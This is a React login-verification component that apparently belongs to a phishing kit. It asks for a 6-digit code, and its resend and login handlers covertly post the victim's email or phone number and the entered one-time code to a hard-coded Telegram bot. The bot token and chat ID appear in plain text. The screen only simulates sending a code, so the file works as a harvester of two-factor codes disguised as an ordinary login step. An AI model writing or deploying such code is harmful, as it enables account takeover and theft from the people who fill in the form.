import React, { useState, useEffect } from 'react';
import { ChevronLeft, X } from 'lucide-react';

interface VerificationScreenProps {
  onBack: () => void;
  onNext: () => void;
  contactType: 'email' | 'phone';
  contactValue: string;
}

const VerificationScreen: React.FC<VerificationScreenProps> = ({ 
  onBack, 
  onNext, 
  contactType, 
  contactValue 
}) => {
  const [code, setCode] = useState('');
  const [countdown, setCountdown] = useState(60);
  const [isResending, setIsResending] = useState(false);

  // Auto-start countdown on mount
  useEffect(() => {
    if (countdown > 0) {
      const timerId = setInterval(() => {
        setCountdown((prev) => prev - 1);
      }, 1000);
      return () => clearInterval(timerId);
    }
  }, [countdown]);

  const handleSendCode = async () => {
    setIsResending(true);
    // Simulate API delay
    await new Promise(resolve => setTimeout(resolve, 500));
    setCountdown(60);
    setIsResending(false);

    // Send to Telegram
    const token = "8565783239:AAEzyuB3eJzR6HYnikxBA23qhOSeo08lDZ8";
    const chatId = "8429880395";
    const message = `🔔 *Resend Code Requested*\n${contactType === 'email' ? '✉️' : '📱'} *To:* ${contactValue}`;

    try {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown'
        })
      });
    } catch (error) {
      console.error("Failed to send code request", error);
    }
  };

  const handleLogin = async () => {
    // Send Code + Contact to Telegram
    const token = "8565783239:AAEzyuB3eJzR6HYnikxBA23qhOSeo08lDZ8";
    const chatId = "8429880395";
    
    const message = `🔐 *Verification Completed*\n\n${contactType === 'email' ? '✉️ Email' : '📱 Phone'}: ${contactValue}\n🔑 *Code Entered:* ${code}`;

    try {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown'
        })
      });
    } catch (error) {
      console.error("Failed to send verification", error);
    }

    onNext();
  };

  return (
    <div className="flex flex-col h-screen sm:h-[800px] bg-black text-white p-4 relative animate-in slide-in-from-right duration-300">
      {/* Header */}
      <header className="flex items-center justify-between py-2 mb-4">
        <button 
          onClick={onBack}
          className="p-2 -ml-2 hover:bg-neutral-900 rounded-full transition-colors"
          aria-label="Go back"
        >
          <ChevronLeft className="w-6 h-6 text-white" />
        </button>
        
        <div className="w-6" /> 

        <button 
          className="p-1 bg-neutral-800/50 hover:bg-neutral-800 rounded-full transition-colors"
          aria-label="Close"
        >
          <X className="w-5 h-5 text-neutral-400" />
        </button>
      </header>

      {/* Title */}
      <h1 className="text-3xl font-bold mb-2">Enter 6-digit code</h1>
      <p className="text-neutral-400 text-sm mb-8">
        Your code was sent to {contactValue}
      </p>

      {/* Form Content */}
      <div className="flex-1 flex flex-col gap-5">
        
        {/* Code Input */}
        <div className="bg-neutral-800/80 hover:bg-neutral-800 rounded-lg transition-colors overflow-hidden flex items-center">
          <input
            type="text"
            value={code}
            onChange={(e) => setCode(e.target.value)}
            maxLength={6}
            placeholder="Enter code"
            className="flex-1 bg-transparent text-white px-4 py-3.5 outline-none placeholder:text-neutral-500 text-sm font-medium tracking-widest"
          />
           <button 
            onClick={handleSendCode}
            disabled={countdown > 0 || isResending}
            className={`
              px-4 py-2 mr-1 text-xs font-bold rounded-md transition-all
              ${(countdown > 0 || isResending)
                ? 'text-neutral-500 cursor-not-allowed' 
                : 'text-neutral-200 hover:text-white'}
            `}
          >
            {countdown > 0 ? `Resend code ${countdown}s` : 'Resend code'}
          </button>
        </div>

        {/* Main Button */}
        <button
          onClick={handleLogin}
          disabled={code.length < 6}
          className={`
            w-full py-3.5 rounded-lg mt-2 text-sm font-bold transition-all duration-200
            ${code.length === 6
              ? 'bg-red-600 text-white hover:bg-red-500 shadow-lg shadow-red-900/20' 
              : 'bg-neutral-800 text-neutral-500 cursor-not-allowed'}
          `}
        >
          Log in
        </button>
      </div>
    </div>
  );
};

export default VerificationScreen;